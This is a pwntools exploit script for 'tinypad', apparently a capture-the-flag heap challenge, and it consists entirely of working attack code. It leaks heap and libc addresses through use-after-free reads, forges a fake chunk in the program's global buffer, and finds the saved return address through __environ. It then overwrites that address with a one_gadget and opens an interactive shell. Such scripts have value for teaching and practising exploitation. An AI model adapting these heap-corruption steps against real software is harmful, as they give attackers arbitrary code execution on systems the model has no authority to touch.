#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./tinypad"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("(CMD)>>> ",str(idx))

def add(length,content):
    opt("A")
    p.sendlineafter("(SIZE)>>> ",str(length))
    p.sendlineafter("(CONTENT)>>> ",str(content))

def free(idx):
    opt("D")
    p.sendlineafter("(INDEX)>>> ",str(idx))

def edit(idx,content):
    opt("E")
    p.sendlineafter("(INDEX)>>> ",str(idx))
    p.sendlineafter("(CONTENT)>>> ",str(content))
    p.sendlineafter("(Y/n)>>> ","Y")

# leak heap && libc
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
add(0x80,"a"*0x80)
add(0x80,"a"*0x20)
free(3)
free(1)

p.recvuntil("# CONTENT: ")
heap_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\0")) - 0x120
success("heap base is -> "+ hex(heap_base))
p.recvuntil("# CONTENT: ")
p.recvuntil("# CONTENT: ")
libc.address = u64(p.recv(6).ljust(8,"\0")) - 0x3c4b78
success("libc address is -> " + hex(libc.address))

free(2)
free(4)

add(0x18,"A"*0x18)
add(0x100,"B"*0xf8 + p64(0x11))
add(0x100,"C"*0xf8)
add(0x100,"D"*0xf8)

tinypad = 0x602040
offset = heap_base + 0x20 - 0x20 - tinypad

payload = flat([
    "4"*0x20,
    0,0x101,
    tinypad+0x20,tinypad+0x20,
    ])
edit(3,payload)
free(1)
add(0x18, '1'*0x10 + p64(offset))
free(2)
edit(4, "4"*0x20 + p64(0) + p64(0x101) + p64(0x7ffff7dd1b78)*2)

# one_gadget = libc.address + 0x4527a
# one_gadget = libc.address + 0xf0364
one_gadget = libc.address + 0xf1207

environ_pointer = libc.sym['__environ']
add(0xf0, '1'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))

p.recvuntil(" #   INDEX: 1\n")
p.recvuntil(" # CONTENT: ")
main_ret = u64(p.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
edit(2, p64(main_ret))
edit(1,p64(one_gadget))

success("environ_pointer is "+ hex(environ_pointer))
gdb.attach(p,"set $h=0x603000,$g=0x602140")
p.interactive()
